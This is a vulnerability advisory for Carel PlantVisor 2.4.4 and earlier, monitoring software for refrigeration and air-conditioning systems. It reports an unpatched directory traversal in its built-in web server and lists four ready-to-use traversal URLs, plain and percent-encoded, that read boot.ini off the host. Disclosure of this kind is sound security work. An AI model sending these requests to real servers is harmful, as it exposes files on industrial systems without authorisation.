@@ -1,0 +1,76 @@
+#######################################################################
+
+                             Luigi Auriemma
+
+Application:  Carel PlantVisor
+              http://www.carel.com/carelcom/web/eng/catalogo/prodotto_dett.jsp?id_prodotto=310
+Versions:     <= 2.4.4
+Platforms:    Windows
+Bug:          directory traversal
+Exploitation: remote
+Date:         13 Sep 2011
+Author:       Luigi Auriemma
+              e-mail: aluigi@autistici.org
+              web:    aluigi.org
+
+
+#######################################################################
+
+
+1) Introduction
+2) Bug
+3) The Code
+4) Fix
+
+
+#######################################################################
+
+===============
+1) Introduction
+===============
+
+
+From vendor's homepage:
+"PlantVisor Enhanced is monitoring and telemaintenance software for
+refrigeration and air-conditioning systems controlled by CAREL
+instruments."
+
+
+#######################################################################
+
+======
+2) Bug
+======
+
+
+CarelDataServer.exe is a web server listening on port 80.
+
+The software is affected by a directory traversal vulnerability that
+allows to download the files located on the disk where it's installed.
+Both slash and backslash and their HTTP encoded values are supported.
+
+
+#######################################################################
+
+===========
+3) The Code
+===========
+
+
+http://SERVER/..\..\..\..\..\..\boot.ini
+http://SERVER/../../../../../../boot.ini
+http://SERVER/..%5c..%5c..%5c..%5c..%5c..%5cboot.ini
+http://SERVER/..%2f..%2f..%2f..%2f..%2f..%2fboot.ini
+
+
+#######################################################################
+
+======
+4) Fix
+======
+
+
+No fix.
+
+
+#######################################################################
